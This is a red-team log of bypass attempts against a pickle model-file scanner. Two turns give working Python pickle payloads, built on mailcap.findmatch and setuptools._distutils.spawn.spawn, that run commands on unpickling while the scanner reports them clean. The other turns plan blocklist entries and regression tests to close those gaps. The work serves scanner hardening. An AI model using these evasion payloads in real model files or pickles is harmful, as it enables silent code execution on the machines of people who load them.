# Picklescan RCE Bypass Game

## Turn 1 - `mailcap.findmatch` policy gap

Goal: produce an RCE-capable pickle that `packages/modelaudit-picklescan`
does not flag.

Payload shape:

```python
import mailcap


class MailcapFindmatchRce:
    def __reduce__(self):
        caps = {
            "text/plain": [
                {
                    "view": "cat %s",
                    "test": "touch /tmp/modelaudit_mailcap_findmatch_rce_marker",
                }
            ]
        }
        return (mailcap.findmatch, (caps, "text/plain", "view", "/tmp/modelaudit-safe-input", []))
```

Proof on CPython 3.12.12:

- Scanner result: `status=complete`, `verdict=clean`, `findings=[]`
- Unpickle result: creates `/tmp/modelaudit_mailcap_findmatch_rce_marker`
- RCE mechanism: `mailcap.findmatch()` evaluates the attacker-controlled
  mailcap `test` command with `os.system()` before returning a viewer command.

Performance note: this is a policy-table miss, not an opcode-analysis miss.
Blocking it should be a constant-time lookup change in `policy.rs` plus a
regression in the adversarial oracle corpus.

## Turn 2 - Block `mailcap.findmatch`

Blocking plan:

- Add `("mailcap", "findmatch")` to the sorted dangerous-global table.
- Add policy coverage so raw `GLOBAL mailcap findmatch` reductions are
  classified as malicious even on Python versions where `mailcap` has been
  removed.
- Add a CPython oracle regression that builds the exact marker-file payload on
  Python versions with `mailcap` and verifies both scanner detection and
  runtime execution.

Performance note: the fix preserves the existing `binary_search_by()` lookup
path and adds one table entry, so hot-path cost remains O(log n) with no extra
payload scanning.

## Turn 3 - `setuptools._distutils.spawn.spawn` namespace gap

Goal: produce another RCE-capable pickle that
`packages/modelaudit-picklescan` does not flag.

Payload shape:

```python
import setuptools._distutils.spawn as dist_spawn


class SetuptoolsDistutilsSpawnRce:
    def __reduce__(self):
        return (dist_spawn.spawn, (["/usr/bin/touch", "/tmp/ma_sdu_marker"],))
```

Proof with CPython 3.12.12 plus `setuptools` installed:

- Scanner result: `status=complete`, `verdict=clean`, `findings=[]`
- Unpickle result: creates `/tmp/ma_sdu_marker`
- RCE mechanism: `setuptools._distutils.spawn.spawn()` directly calls
  `subprocess.check_call(cmd, ...)` with an attacker-controlled command list.

Why the scanner missed it:

- The policy wildcards `distutils`, but Python packaging environments commonly
  expose the compatibility namespace `setuptools._distutils`.
- `global_severity()` checks exact wildcard modules and the top-level module
  only, so `setuptools._distutils.spawn.spawn` does not inherit the existing
  `distutils` wildcard.

Performance note: this is another policy-table miss. The narrow next block is a
sorted `DANGEROUS_GLOBALS` entry for
`("setuptools._distutils.spawn", "spawn")`, which preserves the existing
O(log n) lookup and avoids broad `setuptools` false positives.

## Turn 4 - Block `setuptools._distutils.spawn.spawn`

Blocking plan:

- Add `("setuptools._distutils.spawn", "spawn")` to the sorted
  dangerous-global table instead of wildcarding all `setuptools`.
- Add portable policy coverage for raw `GLOBAL setuptools._distutils.spawn
  spawn` reductions so detection does not depend on `setuptools` being
  installed in the test environment.
- Add an optional CPython oracle regression that imports
  `setuptools._distutils.spawn` when available, verifies scanner detection, then
  verifies runtime marker-file execution.

Performance note: the block is a single additional binary-search entry. It does
not add any module-prefix expansion or extra payload walking.
